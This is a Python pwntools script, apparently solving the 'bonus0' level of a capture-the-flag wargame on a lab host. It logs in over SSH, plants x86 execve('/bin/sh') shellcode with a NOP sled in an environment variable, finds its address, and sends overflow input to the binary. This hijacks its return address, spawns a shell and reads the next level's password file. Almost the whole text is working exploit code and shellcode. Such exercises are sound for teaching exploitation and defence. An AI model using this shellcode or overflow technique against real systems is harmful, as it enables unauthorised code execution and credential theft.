#!/usr/bin/python3

from pwn import *

host = '10.11.248.120'
port = 4242
user = 'bonus0'
password = open("../level9/flag", "rb").read()

with ssh(user=user, host=host, port=port, password=password) as s:

    shellcode = b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xB8\xFF\x2F\x73\x68\xC1\xE8\x08\x50\x68\x2F\x62\x69\x6E\x89\xE3\x31\xD2\x52\x53\x89\xE1\x31\xC0\xB0\x0B\xCD\x80'
    env = {'SHELLCODE': shellcode}

    p = s.process(["/tmp/./getenv"], env=env)

    data = p.recv(timeout=1.0)
    text = data.decode(errors='ignore')

    text = text.split()[-1]

    addr = p32(int(text, 16) + len("SHELLCODE="))

    p = s.process(["./bonus0"], env=env)

    def ssh_send(line):
        if type(line) == str:
            line = line.encode("utf-8")
        elif type(line) != bytes:
            print("[x] Wrong data format !")
            raise ValueError
        print(f"[x] Sending: {line!r}")
        p.sendline(line)

    def ssh_recv(timeout = 1.0) -> str:
        data = p.recv(timeout=timeout)
        text = data.decode(errors='ignore')
        print(f"[x] Received: {text!r}")
        return text

    def wait_for_shell():
        while True:
            output = ssh_recv()
            if output == "$ ":
                break
    
    try:

        ssh_recv()
        ssh_send(b'a' * 20)
        ssh_recv()
        ssh_send(b'b' * 9 + addr + b'b' * 7)

        wait_for_shell()
        ssh_send("cat /home/user/bonus1/.pass")
        flag = ssh_recv().split('\n')[0]
    
    except ValueError:
        exit(1)

    print(f"\nbonus1 password: {flag}\n")

    flagfile = open("flag", "wb")
    flagfile.write(flag.encode("utf-8"))

    s.close()
